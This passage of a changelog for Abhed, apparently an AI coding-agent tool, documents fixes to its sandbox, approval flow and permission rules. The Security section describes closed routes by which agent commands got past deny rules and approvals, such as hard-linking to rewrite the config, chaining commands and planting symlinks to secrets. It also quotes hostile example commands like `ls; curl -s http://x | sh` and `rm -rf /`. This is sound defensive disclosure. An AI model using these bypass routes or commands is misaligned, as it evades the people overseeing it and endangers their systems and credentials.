  only on the next list request, and none succeeded once the server had
  gone. It now changes when the session's end renders.
- A member dropped from `auth.require_group` saw only "forbidden" in the
  workbench, which still said connected, and a reload landed on sign-in with
  no reason. The workbench now shows the reason and its signed-out state,
  and a reload within ten minutes shows the reason on the sign-in page.
- `abhed user passwd <name> -password X` ignored `-password` and printed a
  generated password; `user passwd -password X <name>` answered "no such
  user". Both forms now set the given password, which must still be changed
  at the next sign-in.
- Plan mode put a destructive command or an ask-rule command to the person,
  and ran it if accepted, because those steps came before the mode. Plan
  mode now refuses a mutating call first, as plan mode; read-only calls are
  allowed as before.
- Two interactive CLIs whose first task started in the same second shared a
  session id, and on Postgres one's record was merged into the other's or
  dropped without an error. Each session now gets a random id, and a
  clashing id or step is refused rather than ignored.
- An "always allow" scope outlived its session: after `/clear` or
  `/resume`, a scope chosen in the previous session still approved calls in
  the next, with the grant missing from that session's record. It now ends
  with the session, as documented.
- Opening a finished session in the workbench on Postgres, only to view it,
  claimed it: its row lost its end and reason, other nodes listed it as
  running, and a `/resume` elsewhere was refused. A viewed session now keeps
  its recorded end. The first write, a message or workbench work, claims it
  and first catches up on what another process recorded; while another
  process runs it that write is refused (`409`). A claim for workbench work
  alone is given back after two quiet minutes, or at shutdown, with the end
  it was opened with, and a message refused during a shutdown claims
  nothing. Terminal actions the record refuses are now reported instead of
  dropped.
- A second Ctrl-C that exited while the turn was still stopping recorded
  the session's end as `error`; it is now `user_interrupt`, and no second
  end is written when the turn recorded its own.
- A `task` call made with the `tasks` tool's arguments answered only that
  a prompt is required, and a model could retry it until the turn limit.
  The error now points to the `tasks` tool.
- The SDK's `Agent.Fork` documentation said only that it discards what came
  after; it now says that 0 keeps the whole conversation, that a
  `conversation.forked` event is recorded, and that an abandoned or
  past-the-end step is refused. The `/resume` and `/clear` descriptions in
  the architecture and permissions docs now match the sessions guide.
- A turn with several tool calls, stopped at one of them, left the calls
  after it with no result, so the conversation's next request was refused
  by the provider. A conversation rebuilt from the record (a continued
  session, `/resume`, `/fork`) had the same gap for any refused call, and
  a fork placed after a turn with a refused call dropped that turn and all
  that followed it. Every call now gets an answer, live and when rebuilt:
  a refused call says so with its reason, one the turn ended before says it
  did not run, and one with no recorded result says it may have run. A
  rebuild also keeps each model turn apart and its results in call order.
- A model call stopped part way recorded 0 tokens in and out, however long
  it had streamed. It now records the usage the provider had reported by
  then, such as the prompt tokens Anthropic sends when a reply starts. Most
  OpenAI-compatible servers report usage only when a reply ends, so a call
  stopped there still records none.
- New file or New folder with a collapsed folder selected could lose its
  name input, with a page error, when the folder's listing arrived after
  the input was shown. A redraw of the tree now waits while a name is being
  typed.
- The workbench ignored `message.dropped`: after a shutdown dropped a queued
  message, its bubble still said "still queued for the next step" and
  offered Send now and Cancel. It now reads "Not delivered", with the
  reason, and the text goes back in the message box.
- The console's shutdown, deadline and stalled pills could never appear:
  the session list said only running, done, idle or waiting for approval,
  so an interrupted session read "done" and a drained one stayed "running".
  The pill now shows how each session's last run ended, from the list's new
  `reason`, and the open session's pill follows its record at once.
- A workbench page with nothing running kept showing "● connected" after
  the server stopped, until the person acted. A visible idle page now asks
  the server every few seconds and shows offline soon after it goes.
- In the workbench's line-by-line terminal, a `cd` into a folder with a `$`
  in its name, written as Tab escapes it (`cd price\ \$5\ plan/`), ran as a
  command: the next line ran in the folder while the prompt still showed the
  old one. It is now followed at once, and the prompt moves with it.
- The `write` tool refused a new file whose folder did not exist yet, so in
  `accept-edits` and `auto` mode a new file in a new folder needed a shell
  approval for `mkdir`, and a headless run could not make it at all. It now
  creates the missing folders inside the workspace, one at a time under the
  same guards as the write: none may be Abhed's state or lead out of the
  workspace. A failed write takes the folders back, and `/undo` of the file
  removes them while they are empty.
- `abhed hawkeye` refused the event stream `abhed -p -output-format json`
  writes, one event per line, as "not an exported events file". It reads
  that as well as an `/export` array.
- A stop signal (SIGTERM or a hang-up) in the first second or two of
  `abhed -p`, while it was still starting up, ended it by the signal's
  default action, exiting 143 or 129 with no output. It now ends the run as
  an interrupt and exits 130.
- The process tier never applied `sandbox.max_procs` or
  `sandbox.max_memory_mb`, and the test meant to cover it ran a busy loop,
  not a fork bomb. A command or workbench shell on the process tier now starts with a
  process limit of what the user runs plus `max_procs`, so it can start at
  most that many more; memory is still bounded only on the container and vm
  tiers, which the docs now say; `abhed doctor` warns when `max_memory_mb`
  is set for a tier that ignores it, and when root runs the process tier. A
  command stopped at its timeout now also ends the processes it started that
  left its group with `setsid`, while their parent still ran.
- On a configuration that denies `rm` by its command text, such as the
  console's `bash(rm -*)`, every Delete in the Explorer was refused: a
  delete was screened as the line `rm -- '<path>'`. New folder, rename and
  delete are now judged and recorded as actions of their own, `mkdir`,
  `rename` and `delete`, still carried out in the sandbox and recorded as the
  person's (`by: user`). Write rules on the paths, rules naming the action
  (`delete(**/keep/**)`) and plan mode still refuse them.
- Isolated subagents and `abhed resolve` could not change anything: their
  worktrees were made under `.abhed/worktrees/`, inside Abhed's own state,
  which the file tools and the command sandbox refuse, so every write in a
  worktree was refused and resolve always reported that the agent changed
  nothing. Worktrees are now made in `.abhed-worktrees/`, beside the state,
  and a link planted there is refused. A subagent's worktree is removed
  with its branch only when it is exactly as it was made (no change, commit
  or ignored file), and so are a resolve's worktree and `abhed/issue-<n>`
  branch. A resolve run's own commits on its branch are pushed; commits left
  on a detached HEAD or another branch stop resolve, which keeps the
  worktree and says where they are. A resolve run's commands can no longer
  read the repository's own `.abhed/` from the worktree.
- Under ACP, a call allowed by the editor's earlier "Always allow" was
  recorded `by: reviewer` with no scope; it is now `by: session-scope` with
  the `scope`, as on the CLI and the server.
- A failed invite sign-up, for a taken name or a short password, no longer
  uses up the invite: the account is checked before the code is redeemed.
- The workbench and the console notice a sign-in that ended, whether by a
  restart, a sign-out elsewhere or an administrator: they say "Your sign-in
  ended" with a link to sign in again, and stop showing the run as live.
- The container sandbox tier failed every command on Docker, which refuses
  `--uts private`; it now runs there as it does on Podman. The sandbox's
  hostname is now always `abhed`, and on Podman its PID and UTS namespaces
  are pinned private whatever `containers.conf` says.
- On Debian and Ubuntu, the container image included, commands linked
  through `/etc/alternatives` (`vi`, `vim`, `editor`, `awk` and others) could
  not start in the Linux process sandbox.
- A request that ended while waiting for approval, by an interrupt, Send
  now, a shutdown or a deadline, recorded no outcome: the record went from
  `action.requested` straight to `session.ended`. It now records
  `action.denied` saying why no one answered, such as "interrupted before an
  answer" or "server shut down before an answer".
- The record credited a reviewer who was never asked. A refusal in a run
  with no one to approve read as a person's rejection, and a call allowed by
  an earlier "always allow" read as a reviewer's approval with no scope. Each
  now says who settled it, and the scope that allowed it.
- A turn stopped before the model's first reply, by an interrupt, Send now or
  a shutdown, was recorded as `error`, as if the model had failed.
- Stopping a turn, or the server, did not stop an approved long-running
  command: the turn ended only when the command did, and on SIGTERM what the
  command started could outlive the server. A cancel now kills everything
  the command started while it runs, in every sandbox tier, and removes a
  container command's container. A job the command leaves running in the
  background after it exits is not killed, but no longer holds the call
  open, and the result says it is still running. Closing the terminal the
  CLI runs in, or losing the ssh session, ends the command the same way.
  A command stopped by the run's own time limit says so, instead of
  suggesting a longer `timeout_ms`.
- A message steered into a running turn (202 "steered") just before a
  shutdown was lost with no trace. It is now recorded as `message.dropped`.
  It is still not delivered after a restart.
- When a shutdown ended a command on an idle workbench's terminal, its result
  was recorded after the session's end. It is now recorded before it.
- A call to a tool that does not exist left no action on the record, only
  the model call that asked for it, and a call refused before approval
  because it could not succeed (a relative path, an edit whose text is not
  in the file) left its request with no outcome.
- HawkEYE showed a call with no result as run (✓), including one whose
  approval was never answered; it is now marked not run. A command the
  sandbox refused part of is marked and raises a `sandbox-denied` finding,
  for records that say the command ran under a sandbox.
  HawkEYE says who decided from the event itself, so the person's own
  decline at the line terminal no longer reads "by reviewer", and a headless
  refusal or a remembered scope no longer counts as asking a reviewer.
- Ctrl-C in an interactive session did nothing while a turn was running or
  an approval was waiting, though the banner says it interrupts. It now
  stops the turn and refuses a waiting approval; a turn stopped at an
  approval, a running command or while waiting for the model ends as
  `user_interrupt`. At the prompt Ctrl-C still only clears the line; Ctrl-D
  exits. A second Ctrl-C during a turn that has not stopped ends the session
  with exit code 130.
- The agent's `bash` refused `vim -es`, `vim -e -s`, `vim -E -s` and other
  silent Ex mode edits as interactive. They run a script and exit, so they
  now run; `vim` without them, `vim -e` or `vim -s` alone, and `-s` before
  `-e` (a file of keys, not silent mode) are still refused. An allow rule
  such as `bash(vim -es*)` allows any command, through `:!`.
- The "always allow" offered for `python3 -m unittest -q test_calc` was
  `bash(python3 *)`, which also approved `python3 -c …`. A one-click
  always-allow is now offered only for a short list of well-understood tools
  and subcommands (`git status`, `git commit`, `ls`, `cat`, `grep`, `mkdir`,
  `npm ls`, `docker ps` and a few more, listed in the permissions guide);
  anything else can be approved once or allowed with a rule you write.
  `npm install`, which used to be offered one, is not: it runs package
  scripts. Nor is a command with a `VAR=value` assignment in front.
- Send now during a server drain took the message out of the queue before the
  server refused it, so it was lost to the server and kept only in the page.
  The workbench now asks `/v1/health`, which reports `draining`, and leaves
  the message queued; if the drain starts in between, it says the message is
  no longer queued and puts its text back in the message box.
- The workbench kept showing "connected" after the server had gone. A dropped
  event or shell stream, or a request that cannot reach the server, now shows
  "reconnecting…" or "offline" until the server answers again.
- In the line-by-line workbench terminal, `vi` seemed to hang after `:wq`:
  the process sandbox refuses writes to the home directory, and vim waited at
  "Press ENTER" after failing to save its history file. Every process-tier
  command, the agent's included, now starts vim with that file turned off,
  after reading the person's own vimrc (a vim without scripting, such as
  vim.tiny, reads none). Neovim's history file is turned off the same way,
  though not yet tested. On Linux the sandbox shows no home directory, so vim there runs
  with its defaults.
- Tab in the line-by-line terminal moved focus out of it, to the agent's
  composer, so the next keys went there. Esc, Left and Right no longer put
  `[D`-style text into the line, and a program that is killed no longer
  leaves its screen or key modes behind for the line prompt.
- A `cd` whose folder name was quoted, as `web\ app` or `"web app"`, left
  the line-by-line terminal where it was without a word, so the next line
  ran in the old folder. The quoting is now read as bash reads it, and a
  bare `cd` goes to the workspace root instead of doing nothing.
- The tracked directory, for the line-by-line terminal and the agent's
  commands alike, now moves only for a line that is just `cd <folder>`. It
  used to follow the last `cd` of a chain such as `mkdir x && cd x`, and
  could land in the wrong folder when an earlier part of the line had
  changed directory. A line with `cd`, `pushd`, `popd`, `CDPATH`, `eval` or
  `source` in it, or a `cd` to a folder that is missing or cannot be read
  with confidence, leaves it where it was and says so, naming where the next
  line runs; the agent's result carries the same note. Commands run without
  a sandbox no longer get the server's `BASH_ENV` or `CDPATH`.
- On a phone, the sign-in page's header lost its side margin, so the logo sat
  against the left edge of the screen.
- Between phone and desktop widths the console header was wider than the
  screen and the page scrolled sideways. From 761 to 1180 pixels it now shows
  the mark without the wordmark and "console" label, the health light (its
  text stays for screen readers), and no active-session count or Password
  link (for local accounts the signed-in name links to the account page);
  the model picker and Switch stay. At every width the header items keep
  their size and the signed-in name shrinks into what is left, so a long name
  no longer pushes Sign out off the screen.
- On a phone the console had no model picker and no Switch link, which an
  identity-provider sign-in needs to change user; both now sit at the foot of
  the chat rail. The header shows the health light, and below 400 pixels
  leaves the Admin link to the landing page. The workbench keeps its Switch
  link at every width.
- Stopping the server (SIGTERM) while a turn was running, most often while it
  waited for approval, could exit before the turn recorded `session.ended`,
  so the session listed as running forever. The server now waits, up to five
  seconds, for cancelled turns to record their end before it returns, and a
  turn waiting for approval no longer waits on a slow approval write once
  cancelled. Such a turn ends with reason `shutdown`, as other cancelled
  turns do, where it used to record `user_interrupt`, and so does a turn
  stopped before the model's first reply. A turn started by a
  message to an open session, which is every workbench turn, is now ended
  on shutdown too; before, the server waited on it and exited with no end
  recorded. While the server is stopping, a message to a session gets 503
  with `Retry-After`, whether it would start a turn, steer a running one or
  send it now, and a Send now no longer stops a turn the drain is letting
  finish.
- In a workbench session whose event stream was already open, for example
  after opening a terminal, the first message that needed approval stayed at
  "Thinking" and never showed Allow or Deny, so the run waited for an answer
  no one could give. The prompt now shows on the first turn, after Send now,
  and when the page opens on a session that is waiting for approval.

### Security

- The origin check on state-changing requests now accepts `Origin: null`
  when, and only when, the browser sends `Sec-Fetch-Site: same-origin`, on
  every route. Chrome sends this server's own form posts that way under its
  `Referrer-Policy: no-referrer`; page script cannot set the header, and an
  opaque or other-site initiator is marked `cross-site`. A null origin with
  the header missing, or `same-site`, `cross-site` or `none`, is still
  refused.
- A folder delete from the Explorer escaped a `delete(...)` rule, and a
  folder rename a `rename(...)` rule, on what it held: the rule was put to
  the folder's own path only, so deleting `keep`, or any folder above it,
  got past `delete(**/keep/**)`, and renaming `locked` got past
  `rename(**/locked/**)`. The action's rule is now put to every entry the
  walk visits, and for a rename to each entry's new path too.
- An Explorer rename was not held to `delete(...)` rules at all, so renaming
  `vault`, or a folder above it, got past `delete(**/vault/**)`, and a file
  could be moved out of `vault/` and then deleted from its new place. A
  rename removes what was at its old path, so the old path and every entry
  inside a folder are now also put to `delete(...)` rules, and a deny
  refuses the rename. A `delete(...)` ask rule is recorded as the rename's
  reason and, like any ask in the Explorer, taken as answered, so it does
  not prompt. An ask from any path an Explorer action is judged by, not only
  its own, is now recorded as the action's reason.
- A hard link inside the workspace to a state file of an enclosing folder,
  such as the repository root's `.abhed/config.json` when the session starts
  in `services/ledger`, let a command rewrite that config for the next run
  at the root: the start-time link check covered only the state the run
  itself loads. It now covers the `.abhed` state of every folder above the
  workspace, at every entry point that builds the sandbox.
- Subagents approved every ask on their own: the CLI built them with an
  approver that said yes, so a subagent's `rm -rf`, `git commit` under an
  ask rule, or any default-mode command ran with nobody asked, in every mode
  plan included, and in `-p` too. The parent's record held only the `task`
  call and the summary, and HawkEYE reported nothing. A subagent now answers
  to its parent's approver (the prompt, or the headless refuser), and its
  refused and asked-about calls are in the parent's record and report.
  `limits.nested_subagents: false` was not enforced either: a subagent could
  spawn its own. It now cannot, and when nesting is on, a nested subagent's
  events reach the top-level record.
- A path rule written relative to the workspace, such as
  `write(docs/**/frozen/**)` or `delete(apps/**/vault/**)`, never matched:
  it was compared only with the absolute path the agent and the Explorer
  send, so the write, delete or rename went ahead. Deny and ask path rules
  now also match the path relative to the workspace and to each added
  directory, with or without a leading `./`, and the path with its links
  resolved. Allow path rules match only the resolved target, absolute or
  relative to the workspace. Absolute and `**/` rules match as before.
- On macOS and Windows a capitalised program name got past deny, ask and
  destructive checks: `WHOAMI` past `bash(whoami*)`, `GIT tag` past an ask
  rule, and `GIT reset --hard`, `Git checkout -- .` and `RM -rf` ran with no
  confirmation in modes that approve commands. Program names are now compared
  without case there, in rules, the destructive check, wrappers and scopes;
  a rule still matches as written too, so folding only adds a match.
- The destructive git check missed a git alias and a git named by a
  substitution: `git -c alias.wipe='reset --hard' wipe`,
  `git --config-env=alias.x=X x` and `$(which git) reset --hard` discarded
  work with no confirmation under `bypass`, `auto` or an allow rule. A git
  subcommand git does not have (an alias or extension), a `-c` or
  `--config-env` that sets an alias or include, and a git named by a
  substitution that spells git are now destructive, as are
  `git read-tree -u`, `git checkout-index -f` and `git update-ref`.
- `find … -exec`, `-execdir`, `-ok` and `-okdir` ran a command a deny rule
  names, such as `find . -exec whoami \;` past `bash(whoami*)`. The command
  after them is now matched like one after `xargs`.
- A user told to change a temporary password could clear that demand by
  entering the same password as the new one; `/v1/password` now refuses a
  new password equal to the current one. A self-service password change
  also signs out the user's other sessions, keeping the one that made it:
  at once on the server that made the change, and on any other server
  sharing the account store when that session next reads its account.
- A hard link in the workspace to a state file let a sandboxed command rewrite
  `.abhed/config.json` (and so drop a deny rule for the next start): the file
  tools refused the link, but the command sandbox guards `.abhed` by path,
  and a second name is an ordinary path. The agent cannot make such a link
  on macOS; one that already existed was enough. Every entry point that
  builds the sandbox (the CLI, the server, `abhed rpc`, `abhed acp`,
  `abhed resolve`) now refuses to start, and `abhed doctor` fails, when a
  state file has more than one name, and a configuration file with more than
  one name is not loaded. The message names the file and how to fix it.
- An upload refused because the `uploads` folder was a link into Abhed's
  state (`uploads -> .ABHED`, a link through another link, or a link to a
  folder of `.abhed` not made yet) still made an empty folder inside
  `.abhed` before the refusal. Folders are now made one step at a time under
  the workspace, each step judged by name and, once opened, by identity, and
  a step that is or leads into the state is refused before anything is made.
- One "Always allow" on a harmless git command approved the ones that
  discard work: taking it on `git restore --staged x`, `git checkout HEAD --
  x` or `git stash list` let `git restore .`, `git checkout .`,
  `git stash drop` and `git stash clear` run unasked for the rest of the
  session, and uncommitted work or a stash was lost. Those subcommands no
  longer get a subcommand-wide scope, and the discarding forms of git that
  Abhed recognises, listed in the permissions guide and matched with long
  options shortened as git accepts them, are destructive commands that
  confirm in every mode, which no remembered scope or allow rule satisfies.
  The check is best effort: a single-file `git checkout FILE`, a git alias
  and `git commit --amend` are not caught, and the sandbox stays the
  boundary. `mv`, `cp`, `uniq` and `tree`, which can move a folder out of the
  workspace or write over a file, no longer get a scope.
- "Always allow" on a prompt raised by an ask rule turned that rule off for
  the rest of the session, on the CLI, over ACP and in the console, the
  console's `web_search` rule included. An ask rule now offers no scope, and
  no remembered scope satisfies any call but one that asks by default.
- Removing administrator rights through `POST /v1/admin/users/admin` left
  the person's live session with them until it expired: it could grant
  itself the rights back, reset passwords, add MCP servers and mint invites.
  Removing them now ends that person's sessions, and every local session
  re-reads its account when it may have changed, so any group change applies
  on the next request rather than at the next sign-in.
- An account removed with `abhed user remove` while the server ran kept its
  live sessions, an administrator's included, until they expired. The server
  now signs a session out on its next request once its account is gone. A
  terminal or event stream already open is checked only when it opens, so it
  runs on until it closes.
- `GET /logout` ended the session, so any page could sign a person out with
  an image or a link. Signing out is now a POST behind the same-origin check.
- On a multi-node deployment, an approval pending on another node could be
  answered by anyone signed in who held the session id; it is now answered
  only by the session's owner, as on the node that runs it.
- Keys typed while the interactive approval prompt was showing answered it:
  "Wait, stop", typed as the prompt appeared, approved a write with its `a`,
  and Enter on its own accepted. Now only one of the prompt's keys pressed
  on its own answers it: on an empty line, with at least 300 ms of quiet
  after the choices are drawn and after the previous key, and 300 ms after
  the key itself (600 ms for `A`, which allows for the whole session), so a
  sentence that starts with one ("Actually no") or a held-down key does not
  answer. A key followed at once by Enter shows the choices again, and Enter
  alone never accepts. Other typing is kept on the line and sent as a
  steering message on Enter, and the prompt says so.
- Project memory (`ABHED.md`, `ABHED.local.md`) was read with no check, so
  a link the agent planted there put `.abhed/users.json`, the secrets file or
  a file outside the workspace into the system prompt, and `/memory` printed
  it. Workspace memory files are now read as the file tools read; the
  operator's files in `~/.abhed` and `/etc/abhed` are read only when they
  are not links.
- The git commands Abhed runs itself on the host (the branch and change
  count in every prompt, worktrees for parallel runs, and a resolved issue's
  commit, diff and push) ran whatever the repository's own configuration
  named: an fsmonitor, hooks, clean and smudge filters, textconv and
  external diffs, a signing program, a credential helper or a transport. The
  agent can write that configuration, so it ran with the server's privileges
  outside the sandbox. The settings known to do so are now switched off in
  git's command-line scope, submodules are not entered, a change holding a
  repository of its own is not committed, and git's own environment
  variables are dropped. The list is best effort; this git does not yet
  run inside the sandbox.
- `abhed resolve` pushed with the forge token to whatever the named remote
  pointed at, which the run could change, sending the token to another host.
  It now pushes to an https address built from the issue, from a temporary
  repository with no configuration of its own, so the repository's
  configuration (TLS checks, proxies, address rewrites, transports allowed
  by name) no longer decides where the token goes; only the operator's
  global configuration applies.
- The line that keeps parallel-run worktrees out of `git status` was
  appended to `.git/info/exclude` through any link there, so a link to
  `.abhed/users.json` corrupted it. It is now written as the file tools
  write, and not at all when the git directory is outside the workspace.
- "Approve once" could become "always allow". A node reading an answer from
  the store, because it landed on another node or the turn read the row
  first, remembered the request's scope whatever the reviewer chose. The
  approval row now keeps the scope the answer carried (`answer_scope`), and
  only an answer that chose "always allow" widens the session.
- An approval row stayed open after its request ended unanswered
  (interrupted, shut down, timed out or its turn failed), including one
  written after the turn gave up waiting for it. After a restart, an answer
  with no `request_id` then marked it approved with `204` though nothing
  was waiting, and the record showed an approval no one acted on. A request
  now closes its row when it ends (`ended_at`), a closed row takes no
  answer, and an unbound answer on a node not running the session is
  recorded only when another node is running it.
- `abhed rpc`, `abhed acp` and `abhed resolve` ignored the workspace's
  `sandbox` configuration: `bash` ran on the host with the operator's whole
  environment, the model's API key variable included, and could write outside
  the workspace. They now run it in the configured tier, as the terminal does,
  and refuse to start a session when no backend meets `sandbox.min_tier`. The
  SDK gains `Options.Sandbox` to ask for the same; without it, and without a
  managed `sandbox` setting, an embedded agent still builds no sandbox.
- A command run without a sandbox (the `none` tier, and the unsandboxed
  fallback of the bash tool and the workbench terminal) no longer inherits
  the server's exported bash functions (`BASH_FUNC_*`), `SHELLOPTS` or
  `BASHOPTS`, alongside `BASH_ENV` and `CDPATH`. An exported `cd` or `pwd`
  function ran in place of the builtin, and `SHELLOPTS` changed how every
  line was run.
- Abhed's own state (`.abhed/`, and a users or secrets file configured
  elsewhere) could be reached under another name. On a case-insensitive disk,
  the macOS default, `.ABHED/users.json` and `.Abhed/config.json` open the
  files in `.abhed/`; a file or folder symlink in the workspace pointing into
  it did the same, even one whose target did not exist yet. Through these the
  agent's read, write, edit and a followed `cd` reached it, and so did the
  server's `download`, `file`, `tree` and `search` endpoints, which returned
  the password hashes in `users.json`. Every one of them, and the rest of the
  workbench's path endpoints, now uses one check: names compare without case,
  both the path as given and the path with every link followed are judged,
  and the filesystem is asked whether the path or a folder above it is a
  state directory or a state file. A link swapped in between that check and
  the open is caught too: files are opened under the workspace root held
  open, each folder is judged by identity once opened, and what was opened
  is judged again (see the entry on leaving the workspace below). An upload
  is refused when its folder leads out of the workspace or into the state.
  A hardlink is recognised for the users, config and secrets files, and for
  up to 4,096 other files and folders in the state directories.
- A users file set with `auth.users_file`, or a secrets file set with
  `ABHED_SECRETS_FILE`, could sit where sandboxed commands write, such as a
  folder in the workspace or a temp folder, and be read or replaced. Abhed
  now refuses to start when one does, unless it is under the workspace's or
  the home directory's `.abhed/`; a path that does not exist yet is judged
  by its deepest existing folder, with links followed.
- `glob`, `grep` and the code index followed file symlinks with no check, so
  a link in the workspace to `~/.ssh/id_rsa` or into `.abhed/` was searched
  and printed. `grep` and the index no longer read through links, and none of
  them read a file that is a state file under another name (a hardlink, as
  bounded above) or descend into `.abhed/`; `glob` lists a link only when a
  read of it would be allowed. A write through a link whose target does not
  exist yet is judged by where the target would be.
- `read`, `write`, `edit` and `/undo` could leave the workspace through a
  folder swapped for a link after the path was checked, which a background
  command can do: a read returned a file outside, a write or an undone edit
  replaced one, and an undone creation removed one, including
  `.abhed/users.json`. Files are now opened, written, removed and
  snapshotted under the workspace root held open as an `os.Root`, following
  links only while they stay inside it; the same holds for `/diff`, the
  server's download, viewer, save and upload, and the code index. A link
  into a directory added with `--add-dir` is used in that directory.
- An approval could answer a different request from the one it was shown
  for. `POST /v1/sessions/{id}/approve` named no call, so after Send now a
  click on the interrupted run's prompt approved the new run's call; and an
  answer sent while nothing was pending was held and approved the next
  request unasked. The endpoint now takes an optional `request_id`, the `id`
  of the `action.requested` event being answered (a model's `call_id` is not
  used, because models repeat it across turns):
  - On the node running the session, the reply says what became of the
    answer: 204 the waiting turn took it; 200
    `{"recorded":true,"applied":false}` it was recorded on the store but the
    turn stopped waiting first (it was interrupted or timed out), so nothing
    ran on it; 409 it was refused; 429 too many answers are waiting, retry;
    400 its scope was not the one offered;
    503 the request's row was not written within 30 seconds.
  - An answer naming another request, or one that has ended, is refused
    with 409 "that approval is no longer pending", and is neither taken nor
    recorded. An answer that arrives with an interrupt is refused the same
    way, or reported as recorded but not applied if it reached the store,
    unless the turn took it first.
  - An answer with nothing pending is refused with 409 "no approval is
    pending for this session" and is no longer held. An answer naming a
    request not yet published waits up to two seconds for the turn to
    publish it, then gets that 409. Once published, it waits up to 30 seconds
    more for the request's row to be written, then gets 503. At most eight
    answers wait per session; more get 429 "too many answers are waiting
    for this session" with `Retry-After`, and the workbench and console keep
    the prompt and say "Busy, try again".
  - An answer's `scope` ("always allow") must be empty or the scope the
    request offered; any other is refused with 400, so a client cannot
    widen what is remembered for the session.
  - Two answers at once, with or without a store: one is taken and the other
    refused with 409, so a Deny is never acknowledged while the turn runs the
    Allow. The refusal says "this approval was already answered", or "that
    approval is no longer pending" when it arrives after the turn has moved
    on; which one depends on timing, and a client should treat both alike.
    With a store, the answer is recorded on that request's own row, not the
    session's newest, and the first recorded decides.
  - On a node that is not running the session, an answer naming a request is
    not recorded, since the stored row cannot be checked against it; the
    reply is the usual 421 with `Abhed-Session-Node`, so it can be sent to
    the node that is, or 404 when routing is off. A later release will store
    the request id on the approval row, so any node can check it.
  - An answer without `request_id` still answers the pending request, as
    before, on any node; on another node its 204 means it was recorded on
    the store for the running node to read. Clients should send
    `request_id`, as the workbench and the console now do.

  The workbench and the console also settle a prompt the server refuses an
  answer for (409, or 421 with a note that it must be answered on the server
  running the session), and the workbench settles a run's open prompts when
  the run ends, so they can no longer be clicked.
- A `bash` allow rule no longer approves a chained command. With
  `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
  `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
  allow rule now approves only a command with none of `;`, `&`, `|`, a
  newline, `$(`, `${`, a backtick, `<`, `>`, `(` or `)`, even inside quotes;
  any other command falls through to a prompt. `bash`, `bash(*)` and `*`
  still allow every command. An allow rule such as `bash(cd x && go test*)`
  therefore no longer matches anything, and loading a configuration with one,
  or adding one through the SDK's `Options.Allow`, writes a warning naming it.
- A chained command is offered no "always allow" scope. A remembered scope is
  looked up by name, so after "always allow `bash(git status *)`",
  `git status && curl x | sh` was approved without asking.
- `bash` deny and ask rules match each command in a chain as well as the whole
  line, including commands inside `$(...)`, backticks and subshells:
  `bash(rm -rf /*)` now denies `ls; rm -rf /`. Each command is also matched
  past leading `VAR=value` assignments, redirections and the wrappers `env`,
  `command`, `exec`, `nohup`, `nice`, `builtin`, `sudo`, `doas`, `coproc`,
  `time`, `timeout` (and its duration), `xargs`, `setsid`, `stdbuf` and
  `ionice` with their options, named bare or by path (`/usr/bin/sudo`), so it
  denies `sudo -n rm -rf /` and `timeout -s KILL 5 rm -rf /`. Whether an
  option takes a value is not known, so both readings are matched; a lone `-`
  (`env -`) is an option. The split does not parse quoting, so it can only
  add a denial or a prompt. Its work is linear in the command's length, and a
  command it cannot split in full (over 64 KiB, over 1,024 parts, or a
  wrapper with more than 16 readings) is asked about in every mode, with the
  new step `screen`, while any `bash` deny or ask rule has a pattern.
- A `*` in any rule now matches newlines. Before, a newline anywhere in the
  subject took it past every deny rule bounded by `*`: `bash(*mkfs*)` did not
  deny `echo` and `mkfs /dev/x` on two lines, nor `read(*secret*)` a path with
  a newline in it. An allow rule with a narrower pattern than `*` still never
  approves a subject with a newline in it.
- Workbench: in the line-by-line terminal (`sandbox.terminal: "lines"`), a
  destructive command, one the policy always confirms, is no longer run on
  Enter. The terminal shows the reason and asks `Run it? [y/N]`; only `y` runs
  it, recorded as `action.approved` with `"confirmed": "true"`, and anything
  else is recorded as the person's declined `action.denied` and drops the
  lines queued behind it. `POST
  /v1/sessions/{id}/pty` answers such a line with `confirm` and runs nothing
  until it is sent again with `"confirmed": true` (or `"declined": true`), so
  a client that sends neither never runs it; `"declined": true` for a line
  that needed no confirmation runs and records nothing. Other lines, the
  Explorer and the interactive terminal are unchanged.

## [1.1.2] - 2026-09-25

### Changed

- The terminal carries the new mark: the startup banner draws the Abhed A,
  and the accent the CLI uses for the prompt, tool calls, headings and inline
  code is the brand orange instead of cyan.
- The HawkEYE report uses the console's ink, paper and orange palette in both
  themes.
- The page shown when sign-in is not configured carries the Abhed lockup.
- On a phone, the console and workbench headers show the mark alone, and
  neither page scrolls sideways: the console drops its "console" label and
  Password link, and the workbench drops its Password, Switch and classic
  console links. On both, the signed-in name links to the account page.

### Fixed

- The documentation embedded in the binary linked web fonts, so a connected
  machine made a request to another host when the docs were opened. It now
  uses the system fonts and loads nothing from outside, whichever way the
  binary was built; a test holds it there.

## [1.1.1] - 2026-09-25

### Changed

- The web console, the sign-in page, the workbench, the account page and the
  embedded documentation carry the new Abhed and Zybuu marks and an ink, paper
  and orange palette, with a dark theme designed alongside the light one. On
  the console, sign-in, workbench and account pages the images are embedded in
  the binary as data URIs, so those pages still load nothing from anywhere; no
  route was added.
- The sign-in page shows the mark in place of the animated network, and it
  keeps still under reduced motion.
- `/favicon.ico` is now a PNG; `/favicon.svg` remains an SVG.
- The lockups and marks in `brand/` are PNG files; the SVGs were removed.

## [1.1.0] - 2026-09-24

### Added

- `hawkeye.AnalyzeWith` and `hawkeye.Options`, for what the caller knows
  beyond the record (`Live`: the session is still running there), and
  `hawkeye.Call.Actor` (`actor` in the JSON report): whether the model or a
  person made the call. `Analyze` is unchanged.
- `config.Config.ManagedKeys`, the settings the managed file set as dotted
  paths, and `Config.ManagedSets` to ask about one; `config.Overrides`,
  `Config.Apply`, which lays a caller's overrides over a configuration so
  they may tighten the managed settings and never loosen them, and
  `config.ManagedError`, the refusal it returns; `config.LoadManaged`, the
  defaults with only the managed file applied.
- A configuration key that nothing reads is reported: it is still ignored, so
  every configuration that loaded before still loads, but each one is written
  to standard error once, with its file, its JSON path and, when a known key
  is close, the one probably meant (`model.provider` → `model.default`).
  `abhed doctor` lists them and fails. Keys starting with `_` or `$`
  (`_comment`, `$schema`) are annotations and never reported; one in the
  managed file says so. `config.Config.Unknown` carries them, and
  `config.UnknownKey.Managed` marks one found in the managed file.
- `GET /account`, where a local-accounts user changes their own password, and
  `switch_url` and `password_url` in `/v1/whoami`, naming the routes this
  deployment has for switching user and changing a password.
- Workbench: a **Search** view across the workspace, with match case, whole
  word and RE2 regular expressions, results grouped by file and opened at the
